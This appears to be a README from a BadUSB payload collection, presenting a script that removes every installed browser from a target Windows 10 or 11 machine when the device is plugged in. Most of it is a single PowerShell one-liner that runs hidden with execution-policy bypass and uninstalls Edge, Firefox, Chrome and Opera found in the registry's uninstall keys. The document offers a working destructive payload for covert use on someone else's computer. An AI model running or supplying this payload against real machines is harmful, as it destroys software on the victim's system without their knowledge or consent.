# Remove all Browsers - BadUSB ✅

A script used to remove all target browsers.

**Category**: Execution

<div align=center>

<img src="/main/img/logo-repository-2_0.gif" width="600" /><br>
<img src="/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

A script used to remove all target browsers.

## Getting Started

### Dependencies

* Any Browser installed
* Windows 10,11

### Executing program

* Plug in your device

Execution
```powershell
powershell -w h -ep bypass -Command  "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {($_.DisplayName -like "Microsoft Edge") -or ($_.DisplayName -like "Mozilla Firefox") -or ($_.DisplayName -like "Google Chrome") -or ($_.DisplayName -like "Opera*")} | ForEach-Object {Uninstall-package $_.PSChildName -Verbose}"
```
